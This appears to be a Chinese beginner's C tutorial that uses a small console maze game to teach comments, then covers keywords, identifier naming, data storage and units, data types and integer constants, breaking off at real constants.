<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">printMap</span><span class="hljs-params">(<span class="hljs-type">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] , <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col)</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span>
&#123;
    <span class="hljs-type">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] = &#123;
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span> ,<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;
    &#125;;
    <span class="hljs-type">int</span> row = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>[<span class="hljs-number">0</span>]);
    <span class="hljs-type">int</span> col = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>[<span class="hljs-number">0</span>])/ <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]);
    printMap(<span class="hljs-built_in">map</span>, row, col);
    <span class="hljs-type">int</span> pRow = <span class="hljs-number">2</span>;
    <span class="hljs-type">int</span> pCol = <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> endRow = <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> endCol = <span class="hljs-number">6</span>;
    <span class="hljs-keyword">while</span> (<span class="hljs-string">&#x27;R&#x27;</span> != <span class="hljs-built_in">map</span>[endRow][endCol]) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;亲, 请输入相应的操作\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;w(向上走) s(向下走) a(向左走) d(向右走)\n&quot;</span>);
        <span class="hljs-type">char</span> run;
        run = getchar();
        <span class="hljs-keyword">switch</span> (run) &#123;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow + <span class="hljs-number">1</span>][pCol]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pRow++;<span class="hljs-comment">//3</span>
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow - <span class="hljs-number">1</span>][pCol]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pRow--;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow][pCol - <span class="hljs-number">1</span>]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pCol--;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow][pCol + <span class="hljs-number">1</span>]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pCol++;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
        &#125;
        printMap(<span class="hljs-built_in">map</span>, row, col);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你太牛X了\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;想挑战自己,请购买完整版本\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-type">void</span> <span class="hljs-title function_">printMap</span><span class="hljs-params">(<span class="hljs-type">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] , <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col)</span>
&#123;
    system(<span class="hljs-string">&quot;cls&quot;</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; row; i++) &#123;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; col; j++) &#123;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-built_in">map</span>[i][j]);
        &#125;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
    &#125;
&#125;
</code></pre>
<ul>
<li>编写了注释的程序</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">/*</span>
<span class="hljs-comment">     R代表一个人</span>
<span class="hljs-comment">     #代表一堵墙</span>
<span class="hljs-comment">//   0123456</span>
<span class="hljs-comment">     ####### // 0</span>
<span class="hljs-comment">     #   #   // 1</span>
<span class="hljs-comment">     #R ## # // 2</span>
<span class="hljs-comment">     #   # # // 3</span>
<span class="hljs-comment">     ##    # // 4</span>
<span class="hljs-comment">     ####### // 5</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">     分析:</span>
<span class="hljs-comment">     &gt;1.保存地图(二维数组)</span>
<span class="hljs-comment">     &gt;2.输出地图</span>
<span class="hljs-comment">     &gt;3.操作R前进(控制小人行走)</span>
<span class="hljs-comment">      3.1.接收用户输入(scanf/getchar)</span>
<span class="hljs-comment">      w(向上走) s(向下走) a(向左走) d(向右走)</span>
<span class="hljs-comment">      3.2.判断用户的输入,控制小人行走</span>
<span class="hljs-comment">         3.2.1.替换二维数组中保存的数据</span>
<span class="hljs-comment">             (</span>
<span class="hljs-comment">                1.判断是否可以修改(如果不是#就可以修改)</span>
<span class="hljs-comment">                2.修改现有位置为空白</span>
<span class="hljs-comment">                3.修改下一步为R</span>
<span class="hljs-comment">             )</span>
<span class="hljs-comment">      3.3.输出修改后的二维数组</span>
<span class="hljs-comment">     4.判断用户是否走出出口</span>
<span class="hljs-comment">*/</span>
<span class="hljs-comment">// 声明打印地图方法</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">printMap</span><span class="hljs-params">(<span class="hljs-type">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] , <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col)</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span>
&#123;
    <span class="hljs-comment">// 1.定义二维数组保存迷宫地图</span>
    <span class="hljs-type">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] = &#123;
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span> ,<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;,
        &#123;<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>&#125;
    &#125;;
    <span class="hljs-comment">// 2.计算地图行数和列数</span>
    <span class="hljs-type">int</span> row = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>[<span class="hljs-number">0</span>]);
    <span class="hljs-type">int</span> col = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>[<span class="hljs-number">0</span>])/ <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">map</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]);
    <span class="hljs-comment">// 3.输出地图</span>
    printMap(<span class="hljs-built_in">map</span>, row, col);
    <span class="hljs-comment">// 4.定义变量记录人物位置</span>
    <span class="hljs-type">int</span> pRow = <span class="hljs-number">2</span>;
    <span class="hljs-type">int</span> pCol = <span class="hljs-number">1</span>;
    <span class="hljs-comment">// 5.定义变量记录出口的位置</span>
    <span class="hljs-type">int</span> endRow = <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> endCol = <span class="hljs-number">6</span>;
    <span class="hljs-comment">// 6.控制人物行走</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-string">&#x27;R&#x27;</span> != <span class="hljs-built_in">map</span>[endRow][endCol]) &#123;
        <span class="hljs-comment">// 6.1提示用户如何控制人物行走</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;亲, 请输入相应的操作\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;w(向上走) s(向下走) a(向左走) d(向右走)\n&quot;</span>);
        <span class="hljs-type">char</span> run;
        run = getchar();
        <span class="hljs-comment">// 6.2根据用户输入控制人物行走</span>
        <span class="hljs-keyword">switch</span> (run) &#123;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow + <span class="hljs-number">1</span>][pCol]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pRow++;<span class="hljs-comment">//3</span>
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow - <span class="hljs-number">1</span>][pCol]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pRow--;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow][pCol - <span class="hljs-number">1</span>]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pCol--;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:
                <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;#&#x27;</span> != <span class="hljs-built_in">map</span>[pRow][pCol + <span class="hljs-number">1</span>]) &#123;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27; &#x27;</span>;
                    pCol++;
                    <span class="hljs-built_in">map</span>[pRow][pCol] = <span class="hljs-string">&#x27;R&#x27;</span>;
                &#125;
                <span class="hljs-keyword">break</span>;
        &#125;
        <span class="hljs-comment">// 6.3重新输出行走之后的地图</span>
        printMap(<span class="hljs-built_in">map</span>, row, col);
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你太牛X了\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;想挑战自己,请购买完整版本\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * @brief printMap</span>
<span class="hljs-comment"> * @param map 需要打印的二维数组</span>
<span class="hljs-comment"> * @param row 二维数组的行数</span>
<span class="hljs-comment"> * @param col 二维数组的列数</span>
<span class="hljs-comment"> */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">printMap</span><span class="hljs-params">(<span class="hljs-type">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">6</span>][<span class="hljs-number">7</span>] , <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col)</span>
&#123;
    <span class="hljs-comment">// 为了保证窗口的干净整洁, 每次打印都先清空上一次的打印</span>
    system(<span class="hljs-string">&quot;cls&quot;</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; row; i++) &#123;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; col; j++) &#123;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-built_in">map</span>[i][j]);
        &#125;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
    &#125;
&#125;
</code></pre>
<h2 id="注释的分类">注释的分类</h2>
<ul>
<li>
<p>单行注释</p>
<ul>
<li>// 被注释内容</li>
<li>使用范围:任何地方都可以写注释：函数外面、里面，每一条语句后面</li>
<li>作用范围: 从第二个斜线到这一行末尾</li>
<li>快捷键:Ctrl+/</li>
</ul>
</li>
<li>
<p>多行注释</p>
<ul>
<li>/* 被注释内容 */</li>
<li>使用范围:任何地方都可以写注释：函数外面、里面，每一条语句后面</li>
<li>作用范围: 从第一个/<em>到最近的一个</em>/</li>
</ul>
</li>
</ul>
<h2 id="注释的注意点">注释的注意点</h2>
<ul>
<li>单行注释可以嵌套单行注释、多行注释</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 好好学习 // hzy2003628.top</span>
<span class="hljs-comment">// /* 进我的博客好好学习 */</span>
<span class="hljs-comment">// 坚持</span>
</code></pre>
<ul>
<li>多行注释可以嵌套单行注释</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">/*</span>
<span class="hljs-comment">// 作者：HZY</span>
<span class="hljs-comment">// 描述：第一个C语言程序作用：这是一个主函数，C程序的入口点</span>
<span class="hljs-comment"> */</span>
</code></pre>
<ul>
<li>多行注释不能嵌套多行注释</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">/* </span>
<span class="hljs-comment">学习</span>
<span class="hljs-comment">     /*玩*/</span>
 睡觉 
*/
</code></pre>
<h2 id="注释的应用场景">注释的应用场景</h2>
<ul>
<li>思路分析</li>
</ul>
<pre><code class="hljs plaintext">/*
     R代表一个人
     #代表一堵墙
//   0123456
     ####### // 0
     #   #   // 1
     #R ## # // 2
     #   # # // 3
     ##    # // 4
     ####### // 5

     分析:
     &gt;1.保存地图(二维数组)
     &gt;2.输出地图
     &gt;3.操作R前进(控制小人行走)
      3.1.接收用户输入(scanf/getchar)
      w(向上走) s(向下走) a(向左走) d(向右走)
      3.2.判断用户的输入,控制小人行走
         3.2.1.替换二维数组中保存的数据
             (
                1.判断是否可以修改(如果不是#就可以修改)
                2.修改现有位置为空白
                3.修改下一步为R
             )
      3.3.输出修改后的二维数组
     4.判断用户是否走出出口
*/
</code></pre>
<ul>
<li>对变量进行说明</li>
</ul>
<pre><code class="hljs plaintext">// 2.计算地图行数和列数
int row = sizeof(map)/sizeof(map[0]);
int col = sizeof(map[0])/ sizeof(map[0][0]);
</code></pre>
<ul>
<li>对函数进行说明</li>
</ul>
<pre><code class="hljs plaintext">/**
 * @brief printMap
 * @param map 需要打印的二维数组
 * @param row 二维数组的行数
 * @param col 二维数组的列数
 */
void printMap(char map[6][7] , int row, int col)
&#123;
    system(&quot;cls&quot;);
    for (int i = 0; i &lt; row; i++) &#123;
        for (int j = 0; j &lt; col; j++) &#123;
            printf(&quot;%c&quot;, map[i][j]);
        &#125;
        printf(&quot;\n&quot;);
    &#125;
&#125;
</code></pre>
<ul>
<li>多实现逻辑排序</li>
</ul>
<pre><code class="hljs plaintext">// 1.定义二维数组保存迷宫地图
char map[6][7] = &#123;
    &#123;&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;&#125;,
    &#123;&#x27;#&#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27;#&#x27; ,&#x27; &#x27;, &#x27; &#x27;&#125;,
    &#123;&#x27;#&#x27;, &#x27;R&#x27;, &#x27; &#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27; &#x27;, &#x27;#&#x27;&#125;,
    &#123;&#x27;#&#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27;#&#x27;, &#x27; &#x27;, &#x27;#&#x27;&#125;,
    &#123;&#x27;#&#x27;, &#x27;#&#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27;#&#x27;&#125;,
    &#123;&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;&#125;
&#125;;
// 2.计算地图行数和列数
int row = sizeof(map)/sizeof(map[0]);
int col = sizeof(map[0])/ sizeof(map[0][0]);
// 3.输出地图
printMap(map, row, col);
// 4.定义变量记录人物位置
int pRow = 2;
int pCol = 1;
// 5.定义变量记录出口的位置
int endRow = 1;
int endCol = 6;
// 6.控制人物行走
while (&#x27;R&#x27; != map[endRow][endCol]) &#123;
    ... ...
&#125;
</code></pre>
<h2 id="使用注释的好处">使用注释的好处</h2>
<ul>
<li>注释是一个程序员必须要具备的良好习惯</li>
<li>帮助开发人员整理实现思路</li>
<li>解释说明程序, 提高程序的可读性
<ul>
<li>初学者编写程序可以养成习惯：先写注释再写代码</li>
<li>将自己的思想通过注释先整理出来，在用代码去体现</li>
<li>因为代码仅仅是思想的一种体现形式而已</li>
</ul>
</li>
</ul>
<h2 id="什么是关键字">什么是关键字?</h2>
<ul>
<li>关键字,也叫作保留字。是指一些被C语言赋予了特殊含义的单词</li>
<li>关键字特征:
<ul>
<li>全部都是小写</li>
<li>在开发工具中会显示特殊颜色</li>
</ul>
</li>
<li>关键字注意点:
<ul>
<li>因为关键字在C语言中有特殊的含义, 所以不能用作变量名、函数名等</li>
</ul>
</li>
<li>C语言中一共有32个关键字</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
<th style="text-align:center">7</th>
<th style="text-align:center">8</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">char</td>
<td style="text-align:center">short</td>
<td style="text-align:center">int</td>
<td style="text-align:center">long</td>
<td style="text-align:center">float</td>
<td style="text-align:center">double</td>
<td style="text-align:center">if</td>
<td style="text-align:center">else</td>
</tr>
<tr>
<td style="text-align:center">return</td>
<td style="text-align:center">do</td>
<td style="text-align:center">while</td>
<td style="text-align:center">for</td>
<td style="text-align:center">switch</td>
<td style="text-align:center">case</td>
<td style="text-align:center">break</td>
<td style="text-align:center">continue</td>
</tr>
<tr>
<td style="text-align:center">default</td>
<td style="text-align:center">goto</td>
<td style="text-align:center">sizeof</td>
<td style="text-align:center">auto</td>
<td style="text-align:center">register</td>
<td style="text-align:center">static</td>
<td style="text-align:center">extern</td>
<td style="text-align:center">unsigned</td>
</tr>
<tr>
<td style="text-align:center">signed</td>
<td style="text-align:center">typedef</td>
<td style="text-align:center">struct</td>
<td style="text-align:center">enum</td>
<td style="text-align:center">union</td>
<td style="text-align:center">void</td>
<td style="text-align:center">const</td>
<td style="text-align:center">volatile</td>
</tr>
</tbody>
</table>
<blockquote>
<p>这些不用专门去记住,用多了就会了。在编译器里都是有特殊颜色的。 我们用到时候会一个一个讲解这个些关键字怎么用,现在看一遍,有个印象就OK了</p>
</blockquote>
<h2 id="关键字分类">关键字分类</h2>
<p><img src="https://img-blog.csdnimg.cn/img_convert/813223bb73902ed426e306a8424cb716.png" alt="img"></p>
<h2 id="什么是标识符">什么是标识符?</h2>
<ul>
<li>从字面上理解,就是用来标识某些东西的符号，标识的目的就是为了将这些东西区分开来</li>
<li>其实标识符的作用就跟人类的名字差不多，为了区分每个人，就在每个人出生的时候起了个名字</li>
<li>C语言是由函数构成的，一个C程序中可能会有多个函数，为了区分这些函数，就给每一个函数都起了个名称, 这个名称就是标识符</li>
<li>综上所述: 程序员在程序中给函数、变量等起名字就是标识符</li>
</ul>
<h2 id="标识符命名规则">标识符命名规则</h2>
<ul>
<li>
<p>只能由字母(a~z， A~Z)、数字、下划线组成</p>
</li>
<li>
<p>不能包含除下划线以外的其它特殊字符串</p>
</li>
<li>
<p>不能以数字开头</p>
</li>
<li>
<p>不能是C语言中的关键字</p>
</li>
<li>
<p>标识符严格区分大小写, test和Test是两个不同的标识符</p>
</li>
</ul>
<h2 id="标识符命名规范">标识符命名规范</h2>
<ul>
<li>
<p>见名知意,能够提高代码的可读性</p>
</li>
<li>
<p>驼峰命名,能够提高代码的可读性</p>
</li>
<li>
<p>驼峰命名法就是当变量名或函数名是由多个单词连接在一起,构成标识符时,第一个单词以小写字母开始;第二个单词的首字母大写.</p>
</li>
<li>
<p>例如: myFirstName、myLastName这样的变量名称看上去就像驼峰一样此起彼伏</p>
</li>
<li>
<p>[外链图片转存中…(img-ipMTnUHa-1648814825879)]</p>
</li>
</ul>
<h2 id="什么是数据">什么是数据？</h2>
<ul>
<li>
<p>生活中无时无刻都在跟数据打交道</p>
<ul>
<li>例如:人的体重、身高、收入、性别等数据等</li>
</ul>
</li>
<li>
<p>在我们使用计算机的过程中，也会接触到各种各样的数据</p>
<ul>
<li>例如: 文档数据、图片数据、视频数据等</li>
</ul>
</li>
</ul>
<h2 id="数据分类">数据分类</h2>
<p>静态的数据</p>
<ul>
<li>
<p><em><strong>静态数据是指一些永久性的数据，一般存储在硬盘中</strong></em>。硬盘的存储空间一般都比较大，现在普通计算机的硬盘都有500G左右，因此硬盘中可以存放一些比较大的文件</p>
</li>
<li>
<p>存储的时长：<em><strong>计算机关闭之后再开启，这些数据依旧还在，只要你不主动删掉或者硬盘没坏，这些数据永远都在</strong></em></p>
</li>
<li>
<p>哪些是静态数据：静态数据一般是以文件的形式存储在硬盘上，比如文档、照片、视频等。</p>
</li>
</ul>
<p>动态的数据</p>
<ul>
<li>
<p><em><strong>动态数据指在程序运行过程中，动态产生的临时数据，一般存储在内存中</strong></em>。内存的存储空间一般都比较小，现在普通计算机的内存只有8G左右，因此要谨慎使用内存，不要占用太多的内存空间</p>
</li>
<li>
<p>存储的时长：<em><strong>计算机关闭之后，这些临时数据就会被清除</strong></em></p>
</li>
<li>
<p>哪些是动态数据：当运行某个程序（软件）时，整个程序就会被加载到内存中，在程序运行过程中，会产生各种各样的临时数据，这些临时数据都是存储在内存中的。当程序停止运行或者计算机被强制关闭时，这个程序产生的所有临时数据都会被清除。</p>
</li>
<li>
<p>既然硬盘的存储空间这么大，为何不把所有的应用程序加载到硬盘中去执行呢？</p>
<ul>
<li>主要<em><strong>原因就是内存的访问速度比硬盘快N倍</strong></em></li>
</ul>
</li>
<li>
<p>静态数据和动态数据的相互转换</p>
</li>
</ul>
<p>​           也就是从磁盘加载到内存</p>
<ul>
<li>动态数据和静态数据的相互转换</li>
</ul>
<p>​            也就是从内存保存到磁盘</p>
<ul>
<li>数据的计量单位
<ul>
<li>不管是静态还是动态数据，都是0和1组成的</li>
<li>数据越大，包含的0和1就越多</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">1 B(Byte字节) = 8 bit(位)
// 00000000 就是一个字节
// 111111111 也是一个字节
// 10101010 也是一个字节
// 任意8个0和1的组合都是一个字节
1 KB(KByte) = 1024 B
1 MB = 1024 KB
1 GB = 1024 MB
1 TB = 1024 GB
</code></pre>
<h2 id="c语言数据类型">C语言数据类型</h2>
<ul>
<li><em><strong>作为程序员, 我们最关心的是内存中的动态数据</strong></em>,因为我们写的程序就是在内存中运行的</li>
<li>程序在运行过程中会产生各种各样的临时数据,<em><strong>为了方便数据的运算和操作, C语言对这些数据进行了分类</strong></em>, 提供了丰富的数据类型</li>
<li>C语言中有4大类数据类型:<em><strong>基本类型、构造类型、指针类型、空类型</strong></em></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b511258ae2e27b0f6679bc6cc475c6bd.png" alt="img"></p>
<h2 id="什么是常量">什么是常量?</h2>
<ul>
<li>&quot;量&quot;表示数据。常量，则表示一些固定的数据，也就是不能改变的数据</li>
<li>就好比现实生活中生男生女一样, 生下来是男孩永远都是男孩, 生下来是女孩就永远都是女孩, 所以性别就是现实生活中常量的一种体现</li>
</ul>
<h2 id="常量的类型">常量的类型</h2>
<p>整型常量</p>
<ul>
<li>
<p>十进制整数。例如:666,-120, 0</p>
</li>
<li>
<p>八进制整数,八进制形式的常量都以0开头。例如:0123,也就是十进制的83;-011,也就是十进 制的-9</p>
</li>
<li>
<p>十六进制整数,十六进制的常量都是以0x开头。例如:0x123,也就是十进制的291</p>
</li>
<li>
<p>二进制整数,逢二进一 0b开头。例如: 0b0010,也就是十进制的2</p>
</li>
</ul>
<p>实型常量</p>
